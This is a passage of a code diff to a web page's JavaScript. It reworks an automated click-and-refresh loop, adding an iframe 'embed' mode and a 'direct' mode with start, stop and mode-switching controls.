       running = false;
       if (currentTimeout) { clearTimeout(currentTimeout); currentTimeout = null; }
       if (currentSafetyTimer) { clearTimeout(currentSafetyTimer); currentSafetyTimer = null; }
-      if (currentLoadHandler) {
-        iframe.removeEventListener('load', currentLoadHandler);
-        currentLoadHandler = null;
-      }
-      statusSpan.innerHTML = '⏹️ STOPPED · idle';
+      if (directRefreshTimeout) { clearTimeout(directRefreshTimeout); directRefreshTimeout = null; }
+      if (currentLoadHandler) { iframe.removeEventListener('load', currentLoadHandler); currentLoadHandler = null; }
+      statusSpan.innerHTML = '⏹️ Stopped';
       startBtn.disabled = false;
-      stopBtn.disabled = false;
     }
-    
+
     function startAutomation() {
       if (running) stopAutomation();
-      let rawUrl = urlInput.value;
-      let normalized = normalizeUrl(rawUrl);
-      if (!normalized) {
-        statusSpan.innerHTML = '❌ Please enter a valid URL (https://...)';
-        return;
+      if (currentMode === 'embed') {
+        const url = normalizeUrl(siteUrlInput.value);
+        if (!url) { statusSpan.innerHTML = '❌ Enter a valid URL'; return; }
+        try { new URL(url); } catch(e) { statusSpan.innerHTML = '❌ Invalid URL'; return; }
       }
-      try { new URL(normalized); } catch(e) {
-        statusSpan.innerHTML = '❌ Invalid URL format.';
-        return;
-      }
-      
+      running = true;
       cycleCount = 0;
       cycleCounterSpan.innerText = `🔄 cycles: 0`;
-      currentBaseUrl = normalized;
-      
-      if (currentLoadHandler) iframe.removeEventListener('load', currentLoadHandler);
+      statusSpan.innerHTML = `🚀 Starting (${currentMode} mode)`;
+      // reset any pending timeouts
       if (currentTimeout) clearTimeout(currentTimeout);
       if (currentSafetyTimer) clearTimeout(currentSafetyTimer);
+      if (directRefreshTimeout) clearTimeout(directRefreshTimeout);
+      if (currentLoadHandler) iframe.removeEventListener('load', currentLoadHandler);
       currentLoadHandler = null;
-      
-      running = true;
-      statusSpan.innerHTML = `🚀 STARTING loop → ${new URL(normalized).hostname}`;
-      iframe.src = 'about:blank';
-      setTimeout(() => {
-        if (running) startCycle();
-      }, 80);
+      if (currentMode === 'embed') {
+        iframe.src = 'about:blank';
+        setTimeout(() => { if (running) runCycle(); }, 100);
+      } else {
+        runCycle();
+      }
     }
-    
-    startBtn.addEventListener('click', startAutomation);
-    stopBtn.addEventListener('click', stopAutomation);
-    urlInput.addEventListener('change', () => { if (running) stopAutomation(); });
-    
-    iframe.setAttribute('sandbox', 'allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-top-navigation-by-user-activation');
-    const defaultExample = 'https://example.com';
-    urlInput.value = defaultExample;
-    currentBaseUrl = defaultExample;
-    iframe.src = 'about:blank';
-    statusSpan.innerHTML = '⚡ idle · set URL & START (now with parent page clicks)';
+
+    // Mode switching
+    function setMode(mode) {
+      if (running) stopAutomation();
+      currentMode = mode;
+      if (mode === 'embed') {
+        urlInputGroup.style.display = 'block';
+        viewportEmbed.style.display = 'block';
+        modeEmbedBtn.classList.add('active');
+        modeDirectBtn.classList.remove('active');
+        statusSpan.innerHTML = '🌐 Embed mode: will load URL in iframe';
+      } else {
+        urlInputGroup.style.display = 'none';
+        viewportEmbed.style.display = 'none';
+        modeDirectBtn.classList.add('active');
+        modeEmbedBtn.classList.remove('active');
+        statusSpan.innerHTML = '📄 Direct mode: clicks on this page + refresh';
+      }
+    }
+    modeEmbedBtn.onclick = () => setMode('embed');
+    modeDirectBtn.onclick = () => setMode('direct');
+    startBtn.onclick = startAutomation;
+    stopBtn.onclick = stopAutomation;
+    siteUrlInput.onchange = () => { if (running && currentMode === 'embed') stopAutomation(); };
+
+    // initial setup
+    setMode('embed');
   })();
 </script>
 </body>
